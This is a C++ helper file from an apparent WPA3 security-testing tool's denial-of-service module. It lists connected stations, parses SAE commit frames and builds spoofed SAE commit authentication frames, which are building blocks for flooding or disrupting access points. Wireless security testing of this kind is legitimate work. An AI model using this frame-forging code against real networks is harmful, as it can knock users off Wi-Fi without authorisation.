#include "attacks/DoS_hard/dos_helpers.h"
#include <optional>
#include <logger/error_log.h>

#include "ex_program/external_actors/ExternalConn.h"

extern "C"{
#include "radiotap.h"
#include "radiotap_iter.h"
}

#include "logger/log.h"

using namespace std;
using namespace Tins;

namespace wpa3_tester::dos_helpers{


// TODO make alternative external WB
vector<HWAddress<6>> get_connected_stas(RunStatus &rs){
	const ActorPtr ap = rs.get_actor("access_point");
	vector<HWAddress<6>> result;

	const string out = ap->conn->exec(
		"iw dev $(iw dev | awk '/Interface/{print $2}' | head -1) station dump 2>/dev/null");

	istringstream ss(out);
	string line;
	while(getline(ss, line)){
		if(line.rfind("Station", 0) != 0) continue;
		istringstream ls(line);
		string token, mac_str;
		ls >> token >> mac_str; // "Station" "<mac>"
		try{
			result.emplace_back(mac_str);
		} catch(...){}
	}
	log(LogLevel::INFO, " Found {} connected STAs", result.size());
	return result;
}

std::string bytes_to_hex(const std::vector<uint8_t> &bytes){
	if(bytes.empty()) return "(empty)";
	std::string result;
	for(size_t i = 0; i < bytes.size(); ++i){
		char buf[3];
		snprintf(buf, sizeof(buf), "%02x", bytes[i]);
		result += buf;
		if(i < bytes.size() - 1) result += ":";
	}
	return result;
}

std::string bytes_to_hex_plain(const std::vector<uint8_t> &bytes){
	std::string result;
	result.reserve(bytes.size() * 2);
	for(const uint8_t b : bytes){
		char buf[3];
		snprintf(buf, sizeof(buf), "%02x", b);
		result += buf;
	}
	return result;
}

bool check_fcs_present(const vector<uint8_t> &packet){
	ieee80211_radiotap_iterator it;

	if(ieee80211_radiotap_iterator_init(&it,
		reinterpret_cast<ieee80211_radiotap_header *>(
			const_cast<uint8_t *>(packet.data())),
		static_cast<int>(packet.size()), nullptr) != 0)
		return false;

	while(ieee80211_radiotap_iterator_next(&it) == 0){
		if(it.this_arg_index == IEEE80211_RADIOTAP_FLAGS && it.this_arg != nullptr)
			return (*it.this_arg & 0x10) != 0;
	}

	return false;
}

optional<SAEPair> parse_sae_commit(const vector<uint8_t> &frame_rt){
    if(frame_rt.size() < 4) return nullopt;

    const uint16_t radiotap_len = frame_rt[2] | (frame_rt[3] << 8);
    const bool has_fcs = check_fcs_present(frame_rt);

    constexpr size_t dot11_header = 24;
    constexpr size_t auth_fixed = 6;
    const size_t sae_offset = radiotap_len + dot11_header + auth_fixed;

    if(frame_rt.size() < sae_offset + 2) return nullopt;

    const size_t auth_offset = radiotap_len + dot11_header;
    const uint16_t algo   = frame_rt[auth_offset]     | (frame_rt[auth_offset + 1] << 8);
    const uint16_t seq    = frame_rt[auth_offset + 2] | (frame_rt[auth_offset + 3] << 8);
    const uint16_t status = frame_rt[auth_offset + 4] | (frame_rt[auth_offset + 5] << 8);

    if(algo != 3 || seq != 1) return nullopt;

    // Use span to avoid copying sae data
    const auto sae_data = std::span(frame_rt).subspan(sae_offset);
    size_t remaining = sae_data.size();
    if(has_fcs && remaining >= 4) remaining -= 4;

    if(remaining < 2) return nullopt;

    SAEPair frame;
    frame.status   = status;
    frame.group_id = sae_data[0] | (static_cast<uint16_t>(sae_data[1]) << 8);

    size_t scalar_len  = 0;
    size_t element_len = 0;
    switch(frame.group_id){
        case 19: scalar_len = 32; element_len = 64;  break; // NIST P-256
        case 20: scalar_len = 48; element_len = 96;  break; // NIST P-384
        case 21: scalar_len = 66; element_len = 132; break; // NIST P-521
        default: return nullopt;
    }

    const size_t crypto_total = scalar_len + element_len;
    auto ptr = sae_data.subspan(2); // skip Group ID
    remaining -= 2;
	// --- Token + Scalar + Element depends on status code (wireshark packet-ieee80211.c) ---
    if(status == 76){
    	// only anti-clogging token, no scalar/element
        if(remaining > 0) frame.token.assign(ptr.begin(), ptr.begin() + remaining);
        return frame;
    }

    if(status == 0 || status == 126){
    	// token if more data than scalar+element
        if(remaining > crypto_total){
            const size_t token_len = remaining - crypto_total;
            frame.token.assign(ptr.begin(), ptr.begin() + token_len);
            ptr = ptr.subspan(token_len);
            remaining -= token_len;
        }
    	// scalar + Element
        if(remaining < crypto_total) return nullopt;
        frame.scalar.assign(ptr.begin(), ptr.begin() + scalar_len);
        frame.element.assign(ptr.begin() + scalar_len, ptr.begin() + crypto_total);
        return frame;
    }

    return frame;
}

RadioTap make_sae_commit(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const SAEPair &sae_params){
	if(!sae_params.is_valid()){
		throw run_err("invalid  combinations of sae params");
	}

	Dot11Authentication auth;
	auth.addr1(ap_mac);
	auth.addr2(sta_mac);
	auth.addr3(ap_mac);
	auth.type(Dot11::MANAGEMENT);
	auth.subtype(Dot11::AUTH);
	auth.auth_algorithm(3); // SAE
	auth.auth_seq_number(1);
	auth.status_code(sae_params.status);

	// group 19 (P-256) | optional ACM token | dummy scalar | dummy element
	vector<uint8_t> payload;
	payload.push_back(sae_params.group_id & 0xFF);
	payload.push_back((sae_params.group_id >> 8) & 0xFF);
	payload.insert(payload.end(), sae_params.token.begin(), sae_params.token.end());
	payload.insert(payload.end(), sae_params.scalar.begin(), sae_params.scalar.end());
	payload.insert(payload.end(), sae_params.element.begin(), sae_params.element.end());

	auth.inner_pdu(RawPDU(payload));
	RadioTap rt;
	rt.inner_pdu(auth);
	return rt;
}
}